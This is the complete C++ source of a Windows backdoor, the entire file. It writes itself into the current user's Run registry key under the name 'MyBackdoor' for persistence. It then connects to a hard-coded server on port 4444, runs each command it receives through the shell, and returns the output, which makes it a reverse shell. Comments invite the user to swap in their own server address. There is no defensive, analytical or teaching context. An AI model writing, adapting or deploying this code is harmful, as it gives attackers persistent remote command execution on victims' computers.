#include <winsock2.h>
#include <windows.h>
#include <winsock2.h>
#include <iostream>
#include <string>

// Link with ws2_32.lib
#pragma comment(lib, "ws2_32.lib")

// Function to set up persistence by adding an entry to the Windows Registry
void SetRegistryKey() {
    HKEY hKey;
    LONG result;
    LPCSTR keyPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    LPCSTR valueName = "MyBackdoor";
    char executablePath[MAX_PATH];
    
    // Get the full path of the current executable
    GetModuleFileName(NULL, executablePath, MAX_PATH);
    
    // Create or open the registry key
    result = RegCreateKeyEx(
        HKEY_CURRENT_USER,            // Root key
        keyPath,                      // Subkey path
        0,                           // Reserved, must be zero
        NULL,                        // Class name
        REG_OPTION_NON_VOLATILE,     // Non-volatile registry key
        KEY_SET_VALUE,               // Desired access rights
        NULL,                        // Security attributes
        &hKey,                       // Handle to open key
        NULL                         // Disposition value
    );

    if (result == ERROR_SUCCESS) {
        // Set the value of the registry key
        result = RegSetValueEx(
            hKey,                      // Handle to open key
            valueName,                 // Value name
            0,                         // Reserved, must be zero
            REG_SZ,                    // Value type (string)
            (const BYTE*)executablePath, // Data to be stored
            strlen(executablePath) + 1  // Size of data
        );

        if (result == ERROR_SUCCESS) {
            std::cout << "Registry key set successfully!" << std::endl;
        } else {
            std::cerr << "Failed to set registry key value." << std::endl;
        }

        // Close the registry key
        RegCloseKey(hKey);
    } else {
        std::cerr << "Failed to create or open registry key." << std::endl;
    }
}

// Function to initialize a socket and connect to the remote server
SOCKET InitializeSocket(const std::string& serverIP, int serverPort) {
    WSADATA wsaData;
    SOCKET connectSocket = INVALID_SOCKET;
    struct sockaddr_in serverAddr;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed." << std::endl;
        return INVALID_SOCKET;
    }

    // Create a socket
    connectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (connectSocket == INVALID_SOCKET) {
        std::cerr << "Socket creation failed." << std::endl;
        WSACleanup();
        return INVALID_SOCKET;
    }

    // Set up the server address
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(serverIP.c_str());
    serverAddr.sin_port = htons(serverPort);

    // Connect to the server
    if (connect(connectSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Connection failed." << std::endl;
        closesocket(connectSocket);
        WSACleanup();
        return INVALID_SOCKET;
    }

    return connectSocket;
}

// Function to handle incoming commands from the server
void HandleCommands(SOCKET connectSocket) {
    char recvBuf[1024];
    int bytesReceived;
    
    while (true) {
        // Receive command from the server
        bytesReceived = recv(connectSocket, recvBuf, sizeof(recvBuf) - 1, 0);
        if (bytesReceived <= 0) {
            std::cerr << "Connection lost or error receiving data." << std::endl;
            break;
        }

        // Null-terminate the received data
        recvBuf[bytesReceived] = '\0';
        std::string command(recvBuf);

        // Execute the command and get the result
        FILE* pipe = _popen(command.c_str(), "r");
        if (!pipe) {
            std::cerr << "Failed to execute command." << std::endl;
            continue;
        }

        char resultBuf[1024];
        std::string result;
        while (fgets(resultBuf, sizeof(resultBuf), pipe) != NULL) {
            result += resultBuf;
        }
        _pclose(pipe);

        // Send the result back to the server
        send(connectSocket, result.c_str(), result.length(), 0);
    }

    // Cleanup
    closesocket(connectSocket);
    WSACleanup();
}

int main() {
    // Set up persistence
    SetRegistryKey();

    // Define server IP and port
    const std::string serverIP = "192.168.1.16"; // Replace with your server's IP
    const int serverPort = 4444;                // Replace with your server's port

    // Initialize the socket and connect to the server
    SOCKET connectSocket = InitializeSocket(serverIP, serverPort);
    if (connectSocket == INVALID_SOCKET) {
        return 1; // Exit with error code
    }

    // Handle commands from the server
    HandleCommands(connectSocket);

    return 0;
}
